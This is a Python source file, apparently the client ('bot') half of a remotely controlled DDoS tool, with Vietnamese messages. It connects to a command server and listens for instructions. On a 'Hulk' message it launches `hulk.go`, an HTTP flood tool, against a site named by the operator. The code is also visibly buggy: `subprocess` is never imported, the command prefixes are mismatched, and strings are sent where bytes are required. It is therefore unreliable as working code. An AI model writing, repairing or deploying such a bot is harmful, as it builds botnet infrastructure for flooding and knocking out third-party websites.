import socket 
import threading
from version import * 

class ClientAgent:
    def __init__(self, host="127.0.0.1", port= 65432):
        self.host = host
        self.port = port 
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.is_running = True
    
    def connect(self):
        try:
            self.client_socket.connect((self.host, self.port))
            
        except Exception as e:
            print(f"[CLIENT] Không thể kết nối với máy chủ. {e}")
            return
    def listen_to_server(self):
        while self.is_running:
            try:
                data = self.client_socket.recv(1024).decode("utf-8")
                if not data: 
                    break
                if data.startswith("CMD:"):
                    cmd_string = data.replace("CMD:", "")
                    threading.Thread(target=self.command, args=(cmd_string,), daemon=True).start()
                    # print(cmd_string)
                elif(data.startswith("Hulk")):
                    hulk = data.replace("hulk:", "")
                    try:
                        config = {pair.split("=")[0]: pair.split("=")[1] for pair in hulk.split()}
                        threading.Thread(target=self.hulk, args=(config["site"], config["methods"], config["timeout"],), daemon=True).start()
                    except Exception as e:
                        print(f"[CLIENT]: Lỗi cấu trúc. 'hulk url= methods= timeout= '.{e}")
                else:
                    print(f"[SERVER-CHAT]: {data}")
            except:
                print("[CLIENT] Server mất kết nối.")
                break
    def command(self,cmd_string):
        try:
            self.client_socket.sendall(f"Client đã nhận được lệnh.".encode("utf-8"))
            print(f"Thực thi: {cmd_string}")
        except Exception as e:
            self.client_socket.sendall(f"Lỗi Thực Thi: {e}".encode("utf-8"))

    def hulk(self, site, method, timeout):
        try:
            self.client_socket.sendall(f"Nhận lệnh hulk thực thi.".encode("utf-8"))
            result = subprocess.run(["go","run","hulk.go",f"-site {site}", f"-data GET"],capture_output=True, text=True, timeout=timeout)
            self.client_socket.sendall("Lệnh hoàn thành trong thời gian cho phép")
        except subprocess.TimeoutExpired as e:
            self.client_socket.sendall(f"❌ Lệnh bị Quá Thời Gian (Timeout) sau {e.timeout} giây!")
        except Exception as e:
            self.client_socket.sendall(f"Lỗi Hulk không xác định: {e}")


if __name__ == "__main__":
    try:
        update_version()
        client = ClientAgent()
        client.connect()
        threading.Thread(target=client.listen_to_server, daemon=True).start()
        while True:
            pass
    except KeyboardInterrupt:
        print("Admin: Ctrl + C.")